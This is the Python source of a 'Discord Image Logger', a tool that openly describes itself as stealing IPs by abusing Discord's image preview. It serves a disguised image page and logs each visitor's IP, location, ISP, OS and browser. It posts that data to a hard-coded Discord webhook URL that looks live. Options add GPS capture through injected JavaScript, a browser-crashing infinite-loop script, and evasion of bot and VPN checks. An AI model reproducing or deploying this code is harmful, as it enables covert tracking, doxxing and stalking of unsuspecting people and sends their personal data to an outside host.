# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1470146329870209146/M6JD2r1cbj68Dau1XjHXM08d5G7vf6_PQWJMyL4eiB6TFOWzP6XhvDYbWEOWdvEM1-aN",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxISEhIRExIVFhUWFRAQEBUSFRAVEhAQFRUWFhUVFRUYHSggGBolGxUVITEhJSkrLi4uFx8zODMsNygtLisBCgoKDg0OGhAQGy0eHx8tLS0vKy0tLS0tLS0rLS0tLS0tLS0tLS0tLS0tLS0tLS0uLS0tLS0tLTctLS0tLSstK//AABEIAMQBAQMBIgACEQEDEQH/xAAcAAABBQEBAQAAAAAAAAAAAAAFAAIDBAYBBwj/xAA5EAABAwIEBAQEBQQCAgMAAAABAAIDBBEFEiExBkFRYRMicYEHMpGxFCNyocFCUmLRFeGSsjNDgv/EABoBAAIDAQEAAAAAAAAAAAAAAAIDAAEEBQb/xAArEQACAgEEAQIFBAMAAAAAAAAAAQIRAwQSITFBE1EFFCIyYSMzcYEVkaH/2gAMAwEAAhEDEQA/APbab5G/pb9lIo6b5Gfpb9lIoQSSZLK1ou4gDmSbBY7GONwx5ZC0OA0zHYnsEzHhnkdRViM+px4Vc3RtEliMM45zODZGix0uFsaeqY8Xa4HnoRceoV5MM8bqSomDU4syuDsmXCupJQ8aQmp5TCrQuSOFMcnFRuKJC2McUwlOXHBMRQ9jdEx5CWfRQOKtIgx6jJT3JhRgjCE0N1Cc51lE6RVK/BaRDNL5y23cJjnJteNGv6GxXAbrNpMspboy7TLmvIiVwrq4VtAIyuAKeGnLjZW24a8Ha6HciKLY/D3ua211fE9hclUJYnDsoXyHZLcbGp0i3VWcEEnZY2V5k9lBO+5uijwVKmVQE9oXVzOFdgoksklmSUG0a+m+Rn6W/ZVMaxVlNGXv9Gjm53RW6X5Gfpb9gsz8QMPkkiY+MF3huLnNGpLSLEgc7JOGMZTSl0VnnKGNyj2ZfGsbmrC1vlY25sLm3v1KFRwta4XeHWcG6tsx29wTc2NwRZRR1QF2mw3sXAgtdy3GmoXWyh2bchzs5yNL8rrkg2G41K35Y58cnHH9n47/ANnJwZNJkSnm5n+fH9Iu1UTXyCVkUTWOIjLBo3O0alwb8pN9x0TcGxR8DmvBOmtr3XYaeaZxbHC43IccjHsYHDndwGVazB+B2Zb1Gp/sY5wa31I1KDT5NkX8x/S7ZozwWWS+X4a81SDPDeO/ig7y2LbXtsjarUNDHC0MjYGtHIfyeasrDNxcnt4R0cakorfyxFMIT01yFFyRGQmEKQhNc1EhVDMiY9qkylNcxEmVRBILKlX1bImOke6zWi7ir8iznG9EZKKdo3y5vXKbpsSJWwTF8RKNzrXeB1LdEdocUhnGaKRrx2Oo9RuvOuBuGqSsp3iRh8Rr7Z2vcHZSLjTbquYpwVVUbvGpZDIBrYaStHoNHJtIJwR6a4qIrB8P/EC5EdULG9i8C1j/AJN5LdMka4BzSCDqCNQQhaoW012cqGZo3t5/MPZU8Oku23MIiw6/shlHGWyuaASNdgVyZv0dUn4kGlcAzBhbnAG41RimoWMGwv1VSkqi0BpCveOt03JhQUUSOaBrYKlNKLnVTVEtuaD1cmqkIlylQpZLlVZEiU5kTnbBNoV2VnFRuKuvo3/2lQGmKvgqmVrLharcNG52y67D332UtFqLK1l1WfwL+31SVbkN2s1NL8jP0t+wUqipPkZ+lv2ClWUYQzUsbxZzGuHRwBH7pQUsbBZjGtH+LQPspkldvoHZFc0JJJJUEJJJJQgk1yckoU1YxNKeU0ohbQ26ikJUpFlG96JAsrvUUjQQQdiCD6FQVGJjMWRsdI8bhguG/qdsPdUp6urbr+ENuzmE/QOTkRRZ55hQ/wCPxR0JJDJCQOln6tPsV6USvPOOpm1PhuawsnjuLO8pc3ewvzuoaOLGpWNaPKwgWe97NvUXKc1asKUG+TT8U8MU1U0ucWxy/wBMgsCT0d1Cznw6lqGzyUp80bL53X8rDyynv0VmDgKokINRWH9Mdz+7v9Lc8N4JDRxlkdyAcznON3SSW1cT22CyajNsVLsOMN3ARhpLanTudT7DYKOaaNu7nHr5rfZDMYxfKd1nKjEy7muZOpO5cmqGJJGiqsTj5A+znf7VWLG3N0JLm9/mH+1mn1q42pB5q1Oui5YU0bZlWHi4NwUg1zjYC6BcN1n5mQ7O27Fbyjia0W0vueq3Y86kvyYpY2nRTgwsAXf9OisUvhW8ttFPO7Syz8MvhzlvJ2yRm1EoTin0x0MScXXg0DXX5JktI07qITW2XHTFaABvgtB8ugTprAKPxEsuZQoiuElN4K4pQzkvUnyM/S37BSqKk+Rn6W/YKVCCJJJJQgkkklCCSSSUIJJJMmlDGlzjYAEk9goQcQuLy/GfimWyFkMYLQbXdzWg4e41ZWxSgNyStbctJuCNrtKKmDRQ4z4ge2KYtNrFnhW6hwRzC641scZbcMLGPmI0NyL5AsbxNS5w1nIuGb0WpM/4OkY1os5wzHkBcfwLD2VuSjj3DfS5DUlXHCMjABbkFRkxIu5rAU/Eglky5rm+XsTzsbrStuBqs3qNhbKLtbTRzNLZGhw77j0PJZ2mdJQTsYXOkp5XBgvqY3E2CK/iEMx6utHtfUOHYjUFFDUSiU4WjaxsGpBBtqhtfiHhxFxPIn3QHhjiETaE2NnAhLE4XTR+G062y67XGi5/zMsmR7vAeKG0w+L8QSPcSLWuQCXAX9Ff4fkfODYG40I3TJfh7XSOjyPiaxgAzOdzvcnLbVaagw6PDIHRNk8SZxJe/QAdmjkE9pVY/dzRmOJS6JguLX5nkgFJiL22dckWzG4Au3mQtjVvZUsMc3mad9dR6Hkh8HC1Kw5ml530c4WPqhW1ou2XcOq9WPB6ELU4BjLzVNDnE5wQf4WSjjaxwaNOnZXuFSXVUbv87D0F0iF+sqE5I+T0+Z10Bxg5Xscj90NxmkztFuS0fEeIJ+wGm7pj2y6ArhmTaWLyN9E90K34pKUEzPNU2M8ZWIJVXDFKdkTKRZ8VJVPECSGhlhik+Rn6W/YKVRUnyM/S37BSqihJJKtVVjWDXfoqboiRZUMtUxu7ggstc9/Ow6BDcSxSGBt5HAduZ9kp5fYdDDKXRqYK1rzYX+inDwbi+2/ZeO4p8QpPkpwGjUFxF3OJ2t0W24Bwmoja+eoeS+XKcpJJa0bX76ooScg8umeONyZrli/itivgUbmh1nPOUW3tzWg4kxdtJA+Z3LRo6uOwXz/xTxHJWPLnn0HIei0Qg2ZgQHr034W4E9zXVBuM12t7tWH4OwF1dUCEGwAzv/QDqvojDaJkEbImABrQGi3ZHPhUDJmYxaki/JJd53yRsDe2bzftdHMU/DOBjmsQ7y27fwmYxgcUl5hGDM0F0TtdHjoL2udl53U4gJ3uzOOpI3ILTzHqCs01SHQluDMPCeFwS+NGHucCXNaXksDuttyrVZW3a45bWBOnQLyjE8UrKKQtJL473Y431b6rRcO8Xxz2aTZ3NpSJB9DKLipsjwNRckNvlsfpqERxmcGEn3TJuG6bxRO0Fp3yg+UnrZCOMKwRxeG3VztABvbmUmm3SCb4KWGVRilZI3YkX9Ctu3Emtddx7/Vec4FUSBtnN0GjSRr9FqanC6h0Qnc3yu1BGpaOpHRIyx2ztFb0ghivEUhDsh0GwCx1TilXKfLE4nqSAFK57mlVXuJOjiPQq1kXk0Jpokp2V7RrGwA9X6j6IrRySAfmOBPbYIfCw9XH3V3Na1yGj90E8sf4JuS7LcM+aQuOwFvdafgqkHih42bc+52VvhTh9uTxXhrsw8o0IDe/daKmomxizGho6DRatPhm/rMWTNzRJXYj4fLTmqtdiN2AtOhVXFGuB12KDeIWtyHa5IXmtTq8ym4Td8nUxaeDipI1lNOMottZSunCD4bPdnporYK9jpWp4oyXscbLcZtEz5gozOnNpy5SspgN090LVle6SueG1cQ2MphWk+Rn6W/YKZQ0nyM/S37BTIAiOd9h3JsEAxRjgS4g5Rz5W7lWOLmyfh3PieGvZ52k7GwNx9F55SVdfVWZK51nWtGy13fq6BJyext02neRX48hDE+ILBwj31Gboew5rFVtNNIcz3E93kAn2K9HoODDoZHNZ2Zq7/yKJDCKSHaIOd1dqfqUpROj8zp8KqPLPH24U7oT6An7IvR1lXF8skzQO8ll6cKhvJoA7JGoHRGkZ5a+L7hZgMSxZ1ZAIKiR3lOZrm2Dr9xzWHxPh6SMF7HCRm926OA7tXtVZRQSgh8bT3AAcPcLJ4vgEkAMkJL2DVzT8zR/IToZZQ/gpLTZ1SW1mD4Zxt1KXuYSHOAbcGxy7ovUcazuFs7tf8ig+M0bdZWWA/qaOR6hCAuljlGUbOdlwvHLazaUfGVSyNzBK7UGxvcgrOS4pI1/i3Jz+Z3d3P8AdXaWiZG0GW5JAcGA2sO5XKiaB4ymEW5ZSQR7rNnzY/tNWPQ5HHd0WaTiG4yuyuH9rwDb6q8yuhOojYD1a1oP7LGV9CGeZhJb33b6o18O8MiqqxkFQ5wYQ4gNcW53t1DSd9ddlj9FyVpiMjljdSDlRxEyManXkOaN4K0Qs8eRjXTS6jMAfDj5AX2W5dwXQeE6EU0Ya4WJA89+RznzX91g+JWiOfwmk2YA0X3ssWqTxRVeRanZfZSR1EkZkAHmF7Aajot82nAbYAWta3ZeW0lWW2W4w/iVhjdm0LQLf5GyvSZ4JPcDNWYj4gUQp5gWNIa8X0Hlz87dFmGRyOFwGkemq1OKVZmeXS3P9t/lHtyVJsLRqHe1wudqM8XJ7SlaKFPAeZP/AORZWTQMdyPuVZztHNcdUhqxSnJsJ/kdT1MlOQWPcG9Lmw9ltMJ4kDwBINf7uqwVRNnsFoeHsJfLbkwWzO/gd1pw63Jhp2Ds3Pg2FVEZBoL9LKv/AMOHNtIcttQRuEYpqMhoazyjqdSVNHh7G6u8x6u1+g2CvNhlqsnqQjSfubMeaWOO2wPSxQRjKM7upAc77BPdUxDdkg7lr/8ASMyTtaqk1e0BasePUY47Vk/4A1GTtxIoauNw8rgffVRyyIbiMsT92gHk5uhHuEOjxF0ZyuOZvI8x6o1q9Rhf6n1L3I8EZfbwHvFKSGf8o1JP/wAriB+Wl7jMN43HjMikyiMhrQebdNCVt4pWuF2kEdQQQvmuSuJeXLRYTjTmsLs7m25AkXK1LL7nWn8Ljkp43R6RxdiuogZYm4aR1cdAP3RDCMPbAy27yPO7v0HQLz7hSp8aqY4kkMa6U35uOgv9VsqrFOipyvkyalelFYl/YXmmAB1QGpqLkqnLihJsnsddVRisFVmPxRnLJMxh5AnW3oFdpq+9iCCDqCNQR1BXj/Esb4aidjm3dnuHOvfLe4t7aLYcB1DnQkHYOOXsCBf91HHarInZvmSqRsioxuT/ABFLsnTMbxjhAjf4jR+XJcOHJrllqfCHNeHuy5Ab3JHmA6BeoYvTiaGRnOxLezhsvKquQ6a9k7DOauMTo45Y8kVLJ2iSomLi5x13KHiV19OdhbqpoZbenNXYZ4WeYM83Ik6A9gihKME1NcjskJZZKUJcFWtjyh7T0Q6ilLHNc0kOBBaRoQR0Ks1k+YnX1VPPZaNNBqNvyc/XSjKdLwfS3DeKNqaaKVpvdoDr7h40ddYfjqH88vA3AB9lJ8GKsugnjJ+V7XAdARr9k3jx9piL66G3quX8UVRVGCPDAMDUTllBNw0NFgLDn3KDwSK+HaLz85yG2SlMMbegUTpU5rkm2UmPsBsEMcbk3RMFD6iOzkUGEWcDw8zytjBsN3Ho0br1jDKRrWtAFmtFmD+SsZwLRWDn83ubGOzRq5bueUNC06XEsk3KXSGJUqXke+cBUqmvAQyrxDU6oNVV/ddXcMjBIJ1eJIJV4meqoT1RKEVtUQqbGUG/x9+a66UFZMPmOoYbe32VzDsRzXB0I3BVXfDI4hvKkq/jpKvSx+xOTzgPUrakhpCqgprnrSzsqdI2vBVfle/qYwP3WmfOTqsBwpPaZvdrgt1DKEa6ONrP3LK2IYsyHKXkDMQ0X5lHKOcEArzf4nm/hEcvuiPCHEHiQtzHzN8ru9tirXVmZo1+NcN09YWukb5m6BzTYkdD1VuhwuKBoYwWAVKKsNkpMTsNTZRu0UXpHqPxEL/5DMdCrDJlSZC82RYRmFxyyVDTcZZHZSOWq2DpbLM4Sbumk/ukcR6BFCTjK0Nh9rBFXw3I25YQ8dNnfRBJ2OabOBB6Feh5lSr6Nkos8eh5j3WuOqTf1oVbXTPPpiqT5dUUx6jMJLb35jrbugYK0SnfQtnrnwRqfzahnWNjvo638ox8T6JzSyoGxGR3YjZZ34I//PUHpE0W9Xf9L1uvpWTRuikF2uFiP5HdY9Tj9WNMV0zxKlqu6JMqNFLjfAlTC8mAeLHfSxAe0dC07+yHU9BUOmFNlDJiCcshy6Lz+XSSUqoOyw2bVXYXBAqJjmuLX/M0lpttcGxRdjgBdZMmPa6LRczgaqlUzh2lkzxcxA2FwL9FtabhemsLl5O/zAX9LJU/01ukMhBy6JOBZLRx/rl/9QjGN1uRpKoxUcdK1mS+XxWl1ze2YZd/cKlxhIfDW74fkUoOjUoVRma3GySTdRUtd4htdVaeghEfjzvDWkuDAb+a2hVTD6iH8REInCz3hmW51J5gLdVhNJGqOHPteyA4zEWDMdhuvWPBYxvmsPVB6ltHOTGcpJuCFS7ImeOTcYkGzW2bte41VnD8TM5a63mF2uIGjhyK3M/w+oQ7MxrDzs4uIH72XKnBGxNs0MA/xtZNlKNUgEndga6Ss/h0kFDDzQHRROKayVJ3ZaaNzl9PBdwmqySMPQ/sdFtxV21uvNHPIK02F1+aMC+o09kTRg1HPIQ4uh8eDMNSFk+FJ8s2U7EfuFpmSu1A1adwhr+HntlE0fy3uQdx1VJ8UZjbU1WAFk+Jcad4pY1+UMAI0vmcdx9EWomuug/E/D8kkokjFwWgO7OCqLXkphzAMQE0YdpnBDX20B0uDbkjwksFlsAoDTM8x1JuU7E8eDBpqeQQeeAtrYUxrFMjMrfnd5Wjp3QyCGRrQBewWajxU5/EeLn7ei0FPjzXNsN07ZKPZG6VBGhrCTlO4Vt70FoSS8uV2eWwJ6AlD2xZlMdnzyycx8oWeboi0j7knqSVRdFcldVQqKAZrfhtjDqeaQsaHF7MvmJAFje+i9Dn4pqXAZHRMcAS+7S5p6ZdbryXh0FryeyO1VS4AkA6X6XPoubqckoypC6NhLxnUssC6JxIBuGGw7brK1FQ99T+Kz2kzZtALA7adlSo68/122Bbex+tlfbkdbT6LJLNPyyUvI+NpLi47uJcfUm5T5ZOScwqrKdUnTpObsNEudG8KxKVjQWkuZs5p/pPVqzt0T4dqwJPDcdHbX6p+ogpRpo0YnTNtS4nHPGWXAuLeh5JtVCZ4h1Hld2cNCguL4Q6E+NF8o1e0feyK4HiQd5jtJbN2eNFxcOP5fJS6ZubTRkca4Jq6iONrXttGXta1zst2uN7nTqj/A/w5bSvZUVEgkkbcxsaPy2OPO51cVroBY6oRj/FDIgQDey6cZyqhUoqxcW1LDpnItyBWJbibW6N0780GxvinO4kkBZeqxu58tymxxtgtpHoTsZI/qKruxvP5cyw9I2oqCBctbzt0WkgoWxtDRvzPNSUNvbLTTCf4k/3JIcuqizHFqZqFIEiVrNFEL5D0XaKsMbr8lIo3xAq0xM4Nh+DFRuCiDMdFrLGGFw2K7FckAmyraZnBpm1bjLQmScSNaOpWbMEY+ZxKgc+IbNcfVD6bZdJdhOtxx8h00CpRuPMqoZegt+6kELxrYp+PFT5C3pLhE8hCjBtsmEroK6NJ9mRsKUmMSM0+Yd0QfjEb43NIIJBHugIC6g+Wg3ZLOqFm5Up10TK+Exvy9QCP5VzyKLooNYGxpzX30RTwm8xrt7KpwrCMjnHmQB6I4YGnmuJq53k4Ftg38M3eys0zNVP+F7hPbHZY5t0RIicNVUnGqISBD6p1lWlkt4aIiUZ4ewB9Q4O+Vt/m/0glPZ72t11IC9FFa2niaxmmimv1bxLbDtmrBBSYYbkiYGOfmsLG/NBcQmp2NvGLOvcj+kjnogNXipcTqdVTkBeCOq5kJ5JKpmxpLo0px67fKcwtqRy7LHYlNmcSea47Dqmm/MGrHbgag+qjfM2Ta7eoIvr2K6GPK48doDsFz0MN7loK5HT04/+tSztA/qaPqq4eOTh7ArUs3ALiwrFMLWaLBPGqoNNhz99P2ViIPI10H7lKnlLUWyx4aSZ4R6pKvWZNpjUwlVvGKkpSXPaOROq6jQUsqSH509pU+KUoaQWjTY76KqxD2iY8m7onBTXAJAp4Cg58nQAU10IK6CnXV72T04PtETIAOqK04u2yosbdXotAEEpNjsWKK6R1tI2+oTZsPadWqwHKaNytZ5p9jHpsbjVAB12mxXc6nxYAO0VC660Mm6NnAzQ2TcQnhMYdICdhqUerKOKYDMNtjsUO4fg8pd1NkZIAXG1eVvJx4M0mchjDQANANArDZFCG9vopQ2ywttuwSVrk9rlEAkDZBLlBItDVDqoWKuMeqdc/VZY/cMKlNKBIw9wjuNVJu3uFlnnW6NV82eON/a3uFeWFyTNWml2iIO1ur0UmxQwPVmCS+iGcKRqsORVEhaWtBcOY3CoClFyCLG99rWWy4foPDYHO3IuqtX4fi+cAhxynt3XO+aqW1DYwMjWULT2Kpmits63oAtdimCOALozcdDvZZeoZIDYAfutuDPvXDLlGiNkAbr+5XfEaoxTk/MfZSxxAJz/ACLsfmSTvZJMoqzzzKrOFM/MCrozwtS55XXtYNuSV3drlwhWVLaWpIs1wW79EErqN8R1aQ0/KSDYr0VtbBELaX6m17oXjGMRStLHAEfb0ToaKaXLMWGbgzC509sifiMcYN4ybdDyVWIFxsBc9kE8Tj2bI50ywJE8SKP8JJ/Y76KRtBKf6ClcB+svcsxSBT+KlQYO86ucB1A3RYYXGRsR31SZyigvn4w4BrZFI2WynkwkA+UuP8IZirTGct+SvFD1HSCXxKLXRUrp8zrqu3XRMcVcwemMkrQBfmfQLp/twOZknvk5M1mG0+SNre1z6lWXW6FTVRa0NJ0BsBYEkeqjecoBJGU3sbjluuHkblJsQ0NCeSFXL7gkOFu26jY489u+6WCXBrzTHCyh8Tpquuf2Ua4LseJlWqXX2TJuygOnNJUOQ7K8+i0GH0wfRXA8wkdbsFm5nXK0vCs35EzDycHW7Ef9Ks6ahZo07+oFtc4GxaVforhwceRB76KJ8uptsnselTluibkj0IYkHxgg20GizuJykkj6KjBUkDQps02hK5kNPtnZpUuA9hGMl0dydR5XdiFWxOBr/My3fTcrP8OVjfGdGflf/wCy0piLNibIsmL0slrgHdZnJWluh3TNUaxGNpF7a8iN0BkeWmx+1lrxS3CpImukq3jpLXTAow10YweUtZKQdbBJJd3H2Bm+0F1FQ4nUqJ8h6pJLfbMBE4q9gZ/MSSWbN9rBZqoxzuVI06JJLjSEMday41111JUieSVpWb4kb5x6LiS2aH9wbABlaDhpgs53O4CSS26p/psOXQWlrXg5LjK75gRvZNfJ5uVt8v8AT9CkkuQgBQtF7AAc9OqlkcUklGAxRm6dGM266kqKK04sVQmckkhGRIwifD0hDnt5Fhv7LqSHIvpGw+4hMhzH1VqOQpJLPJcHQiXInFR1TzlKSSTBfUN8ATCZj47df6l6c9mgPa6SSH4ilaAgB6uQkHl6ITXsANvuuJINMXIp5UkklvBP/9k=", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://web.archive.org/web/20240529211325/https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
